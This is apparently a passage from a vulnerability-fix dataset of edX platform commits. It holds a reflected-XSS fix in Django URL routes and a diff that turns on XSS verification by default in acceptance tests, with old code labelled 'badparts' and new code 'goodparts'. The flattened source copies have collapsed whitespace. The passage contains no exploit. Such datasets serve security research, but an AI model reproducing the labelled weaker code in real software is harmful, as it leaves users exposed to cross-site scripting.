url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n"
                }
            },
            "msg": "Fix LMS-530, reflected XSS\n\nLimit the page and chapter numbers to digits, to keep malicious URL\ncomponents from being inserted onto the page."
        },
        "1162dbc18fda91b07a5942873387d60fd67b2cfc": {
            "url": "https://api.github.com/repos/ExtensionEngine/ed2go-edx-platform/commits/1162dbc18fda91b07a5942873387d60fd67b2cfc",
            "html_url": "https://github.com/ExtensionEngine/ed2go-edx-platform/commit/1162dbc18fda91b07a5942873387d60fd67b2cfc",
            "sha": "1162dbc18fda91b07a5942873387d60fd67b2cfc",
            "keyword": "XSS check",
            "diff": "diff --git a/pavelib/paver_tests/test_paver_bok_choy_cmds.py b/pavelib/paver_tests/test_paver_bok_choy_cmds.py\nindex 0573565146..9f37700463 100644\n--- a/pavelib/paver_tests/test_paver_bok_choy_cmds.py\n+++ b/pavelib/paver_tests/test_paver_bok_choy_cmds.py\n@@ -18,7 +18,7 @@ class TestPaverBokChoyCmd(unittest.TestCase):\n     Paver Bok Choy Command test cases\n     \"\"\"\n \n-    def _expected_command(self, name, store=None, verify_xss=False):\n+    def _expected_command(self, name, store=None, verify_xss=True):\n         \"\"\"\n         Returns the command that is expected to be run for the given test spec\n         and store.\n@@ -101,11 +101,11 @@ def test_verify_xss(self):\n         self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n \n     def test_verify_xss_env_var(self):\n-        self.env_var_override.set('VERIFY_XSS', 'True')\n+        self.env_var_override.set('VERIFY_XSS', 'False')\n         with self.env_var_override:\n             suite = BokChoyTestSuite('')\n             name = 'tests'\n-            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n+            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))\n \n     def test_test_dir(self):\n         test_dir = 'foo'\ndiff --git a/pavelib/utils/test/suites/bokchoy_suite.py b/pavelib/utils/test/suites/bokchoy_suite.py\nindex 19d51da7b5..327b6b9c3c 100644\n--- a/pavelib/utils/test/suites/bokchoy_suite.py\n+++ b/pavelib/utils/test/suites/bokchoy_suite.py\n@@ -58,7 +58,7 @@ def __init__(self, *args, **kwargs):\n         self.default_store = kwargs.get('default_store', None)\n         self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n         self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n-        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n+        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))\n         self.extra_args = kwargs.get('extra_args', '')\n         self.har_dir = self.log_dir / 'hars'\n         self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n",
            "message": "",
            "files": {
                "/pavelib/paver_tests/test_paver_bok_choy_cmds.py": {
                    "changes": [
                        {
                            "diff": "\n     Paver Bok Choy Command test cases\n     \"\"\"\n \n-    def _expected_command(self, name, store=None, verify_xss=False):\n+    def _expected_command(self, name, store=None, verify_xss=True):\n         \"\"\"\n         Returns the command that is expected to be run for the given test spec\n         and store.\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/pavelib/paver_tests/test_paver_bok_choy_cmds.py",
                            "badparts": [
                                "    def _expected_command(self, name, store=None, verify_xss=False):"
                            ],
                            "goodparts": [
                                "    def _expected_command(self, name, store=None, verify_xss=True):"
                            ]
                        },
                        {
                            "diff": "\n         self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n \n     def test_verify_xss_env_var(self):\n-        self.env_var_override.set('VERIFY_XSS', 'True')\n+        self.env_var_override.set('VERIFY_XSS', 'False')\n         with self.env_var_override:\n             suite = BokChoyTestSuite('')\n             name = 'tests'\n-            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n+            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))\n \n     def test_test_dir(self):\n         test_dir = 'foo'",
                            "add": 2,
                            "remove": 2,
                            "filename": "/pavelib/paver_tests/test_paver_bok_choy_cmds.py",
                            "badparts": [
                                "        self.env_var_override.set('VERIFY_XSS', 'True')",
                                "            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))"
                            ],
                            "goodparts": [
                                "        self.env_var_override.set('VERIFY_XSS', 'False')",
                                "            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))"
                            ]
                        }
                    ],
                    "source": "\n\"\"\" Tests for the bok-choy paver commands themselves. Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py \"\"\" import os import unittest from mock import patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec and store. \"\"\" expected_statement=( \"DEFAULT_STORE={default_store} \" \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \" \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \" \"VERIFY_XSS='{verify_xss}' \" \"nosetests{repo_dir}/common/test/acceptance/{exp_text} \" \"--with-xunit \" \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec, default_store='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with self.env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite('', test_dir=test_dir) self.assertEqual( suite.cmd, self._expected_command(name=test_dir) ) def test_verbosity_settings_1_process(self): \"\"\" Using 1 process means paver should ask for the traditional xunit plugin for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '' ) ) suite=BokChoyTestSuite('', num_processes=1) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_2_processes(self): \"\"\" Using multiple processes means specific xunit, coloring, and process-related settings should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_3_processes(self): \"\"\" With the above test, validate that num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_invalid_verbosity_and_processes(self): \"\"\" If an invalid combination of verbosity and number of processors is passed in, a BuildFailure should be raised \"\"\" suite=BokChoyTestSuite('', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command test cases. Most of the functionality is inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop) def _expected_command(self, report_dir, start_urls): \"\"\" Returns the expected command to run pa11ycrawler. \"\"\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher=logout ' '--pa11y-reporter=\"1.0-json\" ' '--depth-limit=6 ' ).format( start_urls=' '.join(start_urls), report_dir=report_dir, ) return expected_statement def test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self._mock_sh.assert_has_calls([ call( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)), ]) ",
                    "sourceWithComments": "\"\"\"\nTests for the bok-choy paver commands themselves.\nRun just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py\n\"\"\"\nimport os\nimport unittest\n\nfrom mock import patch, call\nfrom test.test_support import EnvironmentVarGuard\nfrom paver.easy import BuildFailure\nfrom pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler\n\nREPO_DIR = os.getcwd()\n\n\nclass TestPaverBokChoyCmd(unittest.TestCase):\n    \"\"\"\n    Paver Bok Choy Command test cases\n    \"\"\"\n\n    def _expected_command(self, name, store=None, verify_xss=False):\n        \"\"\"\n        Returns the command that is expected to be run for the given test spec\n        and store.\n        \"\"\"\n\n        expected_statement = (\n            \"DEFAULT_STORE={default_store} \"\n            \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \"\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \"\n            \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"VERIFY_XSS='{verify_xss}' \"\n            \"nosetests {repo_dir}/common/test/acceptance/{exp_text} \"\n            \"--with-xunit \"\n            \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \"\n            \"--verbosity=2 \"\n        ).format(\n            default_store=store,\n            repo_dir=REPO_DIR,\n            shard_str='/shard_' + self.shard if self.shard else '',\n            exp_text=name,\n            a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',\n            verify_xss=verify_xss\n        )\n        return expected_statement\n\n    def setUp(self):\n        super(TestPaverBokChoyCmd, self).setUp()\n        self.shard = os.environ.get('SHARD')\n        self.env_var_override = EnvironmentVarGuard()\n\n    def test_default(self):\n        suite = BokChoyTestSuite('')\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_suite_spec(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_class_spec(self):\n        spec = 'test_foo.py:FooTest'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_testcase_spec(self):\n        spec = 'test_foo.py:FooTest.test_bar'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_spec_with_draft_default_store(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec, default_store='draft')\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='draft')\n        )\n\n    def test_invalid_default_store(self):\n        # the cmd will dumbly compose whatever we pass in for the default_store\n        suite = BokChoyTestSuite('', default_store='invalid')\n        name = 'tests'\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='invalid')\n        )\n\n    def test_serversonly(self):\n        suite = BokChoyTestSuite('', serversonly=True)\n        self.assertEqual(suite.cmd, \"\")\n\n    def test_verify_xss(self):\n        suite = BokChoyTestSuite('', verify_xss=True)\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_verify_xss_env_var(self):\n        self.env_var_override.set('VERIFY_XSS', 'True')\n        with self.env_var_override:\n            suite = BokChoyTestSuite('')\n            name = 'tests'\n            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_test_dir(self):\n        test_dir = 'foo'\n        suite = BokChoyTestSuite('', test_dir=test_dir)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=test_dir)\n        )\n\n    def test_verbosity_settings_1_process(self):\n        \"\"\"\n        Using 1 process means paver should ask for the traditional xunit plugin for plugin results\n        \"\"\"\n        expected_verbosity_string = (\n            \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else ''\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=1)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_2_processes(self):\n        \"\"\"\n        Using multiple processes means specific xunit, coloring, and process-related settings should\n        be used.\n        \"\"\"\n        process_count = 2\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_3_processes(self):\n        \"\"\"\n        With the above test, validate that num_processes can be set to various values\n        \"\"\"\n        process_count = 3\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_invalid_verbosity_and_processes(self):\n        \"\"\"\n        If an invalid combination of verbosity and number of processors is passed in, a\n        BuildFailure should be raised\n        \"\"\"\n        suite = BokChoyTestSuite('', num_processes=2, verbosity=3)\n        with self.assertRaises(BuildFailure):\n            BokChoyTestSuite.verbosity_processes_string(suite)\n\n\nclass TestPaverPa11yCrawlerCmd(unittest.TestCase):\n\n    \"\"\"\n    Paver pa11ycrawler command test cases.  Most of the functionality is\n    inherited from BokChoyTestSuite, so those tests aren't duplicated.\n    \"\"\"\n\n    def setUp(self):\n        super(TestPaverPa11yCrawlerCmd, self).setUp()\n\n        # Mock shell commands\n        mock_sh = patch('pavelib.utils.test.suites.bokchoy_suite.sh')\n        self._mock_sh = mock_sh.start()\n\n        # Cleanup mocks\n        self.addCleanup(mock_sh.stop)\n\n    def _expected_command(self, report_dir, start_urls):\n        \"\"\"\n        Returns the expected command to run pa11ycrawler.\n        \"\"\"\n        expected_statement = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains=localhost '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher=logout '\n            '--pa11y-reporter=\"1.0-json\" '\n            '--depth-limit=6 '\n        ).format(\n            start_urls=' '.join(start_urls),\n            report_dir=report_dir,\n        )\n        return expected_statement\n\n    def test_default(self):\n        suite = Pa11yCrawler('')\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(suite.pa11y_report_dir, suite.start_urls)\n        )\n\n    def test_get_test_course(self):\n        suite = Pa11yCrawler('')\n        suite.get_test_course()\n        self._mock_sh.assert_has_calls([\n            call(\n                'wget {targz} -O {dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)),\n            call(\n                'tar zxf {dir}demo_course.tar.gz -C {dir}'.format(dir=suite.imports_dir)),\n        ])\n\n    def test_generate_html_reports(self):\n        suite = Pa11yCrawler('')\n        suite.generate_html_reports()\n        self._mock_sh.assert_has_calls([\n            call(\n                'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)),\n        ])\n"
                },
                "/pavelib/utils/test/suites/bokchoy_suite.py": {
                    "changes": [
                        {
                            "diff": "\n         self.default_store = kwargs.get('default_store', None)\n         self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n         self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n-        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n+        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))\n         self.extra_args = kwargs.get('extra_args', '')\n         self.har_dir = self.log_dir / 'hars'\n         self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/pavelib/utils/test/suites/bokchoy_suite.py",
                            "badparts": [
                                "        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))"
                            ],
                            "goodparts": [
                                "        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))"
                            ]
                        }
                    ],
                    "source": "\n\"\"\" Class used for defining and running Bok Choy acceptance test suite \"\"\" from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils import os try: from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir -parent directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various set-up tasks(e.g., collectstatic) serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning of environment test_spec -when set, specifies test files, classes, cases, etc. See platform doc. default_store -modulestore to use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super(BokChoyTestSuite, self).__init__(*args, **kwargs) self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False)) self.extra_args=kwargs.get('extra_args', '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs.get('coveragerc', None) self.save_screenshots=kwargs.get('save_screenshots', False) def __enter__(self): super(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg bokchoy_utils.check_services() if not self.testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils.wait_for_test_servers() try: CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install() print 'Forums permissions/roles data has been seeded' except FixtureError: pass if self.serversonly: self.run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback) if self.testsonly: msg=colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.') print msg else: msg=colorize('green', \"Cleaning up databases...\") print msg sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct the proper combination for use with nosetests. \"\"\" substring=[] if self.verbosity !=DEFAULT_VERBOSITY and self.num_processes !=DEFAULT_NUM_PROCESSES: msg='Cannot pass in both num_processors and verbosity. Quitting' raise BuildFailure(msg) if self.num_processes !=1: substring=[ \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format(self.xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then static assets are collected \"\"\" sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have courses in them. For example, if the course is located in `test_root/courses/test-example-course/`, self.imports_dir should be `test_root/courses/`. \"\"\" msg=colorize('green', \"Importing courses from{}...\".format(self.imports_dir)) print msg if self.imports_dir: sh( \"DEFAULT_STORE={default_store}\" \"./manage.py cms --settings=bok_choy import{import_dir}\".format( default_store=self.default_store, import_dir=self.imports_dir ) ) def load_data(self): \"\"\" Loads data into database from db_fixtures \"\"\" print 'Loading data from json fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store}\" \"./manage.py lms --settings bok_choy loaddata --traceback\" \" common/test/db_fixtures/*.json\".format( default_store=self.default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue to run in the current session unless interrupted. \"\"\" print 'Bok-choy servers running. Press Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir / self.test_spec if self.serversonly: return \"\" cmd=[ \"DEFAULT_STORE={}\".format(self.default_store), \"SCREENSHOT_DIR='{}'\".format(self.log_dir), \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir), \"VERIFY_XSS='{}'\".format(self.verify_xss), \"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) 